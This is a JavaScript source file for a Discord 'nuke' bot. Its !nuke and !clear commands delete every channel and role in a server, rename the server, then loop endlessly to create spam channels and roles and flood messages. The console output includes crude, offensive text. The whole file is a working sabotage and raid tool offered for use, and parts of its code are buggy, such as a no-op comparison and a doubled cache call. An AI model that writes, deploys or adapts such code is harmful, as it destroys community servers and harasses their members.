
const { Client, Intents, WebhookClient } = require("discord.js");
const { exec } = require('child_process');
const { Worker } = require('worker_threads');
const express = require('express');
const app = express();
const config = require("./config.json");
const port = 6969;
const path = require("path");
const threads = 5; //this defaults at 5, higher = more power, but can lead to slowing computer or faster rate limits, but makes bot nuke faster! change with caution
var bean = false;
var ispaused = false;

    

  function yeet(guildid) {
    try {
    let guild;
      guild = client.guilds.cache.get(guildid);
      guild.channels.cache.forEach(channel => {console.log(channel.name); channel.delete()})
  
  // Loop through each channel in the server
        
          guild.channels.cache.cache.forEach((channel) => {
          
          channel.delete()
            .then(console.log(`Deleted channel ${channel.name}`))
            .catch();
        });
      } catch {

      }
  }
  function init(guildid) {
    
  }
  
  
  const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
  });
 
client.on("ready", () => {
  console.log("Nuke discord bot online! (;");
  exec('open http://localhost:6969/nuke');
});


client.on("messageCreate", async message => { // instead of 'message', it's now 'messageCreate'
  if(message.content == "!clear") {
    client.channels.cache.each(async (channel) => {
      // perform some action on each channel here
      channel.delete();
    });
  }
  if (message.content === "!pause") {
    if(ispaused == false) {
    if(bean == true) {
      bean == false;
    }
  }
  }
  if (message.content === "!unpause") {
    if(ispaused == true) {
    if(bean == false) {
      bean = true;
    }
  }
  }
  if (message.content === "!nuke") {
    const channelnames = config.channelnames;
    const webhookname = config.webhookname;
    const messagee = config.messagetospam;
    console.log("made by conspiracy#0001 to fuck little toddlers! thanks for using!");
    console.log('Nuke has been initialized. fucking poor ass dude!');
    let guild;
    
    client.channels.cache.each(async (channel) => {
      // perform some action on each channel here
      channel.delete();
    });
    console.log("deleted all channels!");
    
    try { guild = client.guilds.cache.get(config.guildid);
    guild.setName(config.servername);
    message.guild.roles.cache.forEach(role => {
      role.delete();
      // perform a task for each role here
    }); } catch {

    }
    console.log("deleted all roles!");
    try { guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename }) } catch {}
        bean = true;
        while(bean == true) { 
          const testChannel = await guild.channels.create(channelnames, {
            type: 'GUILD_TEXT',
            permissionOverwrites: [{
              id: message.guild.id,
              allow: ['VIEW_CHANNEL'],
            }],
          });
          try { guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename }); } catch {}
          try { testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee);testChannel.send(messagee); } catch {}
          try { guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename });guild.roles.create({ name: config.rolename }); } catch {}

         
    }

    
      
      
    }
    else if (message.content === "channel") {
      message.guild.channels.create("channel name", { 
          type: "GUILD_TEXT", // syntax has changed a bit
          permissionOverwrites: [{ // same as before
              id: message.guild.id,
              allow: ["VIEW_CHANNEL"],
          }]
      });
      message.channel.send("Channel Created!");
    }})


client.login(config.token);
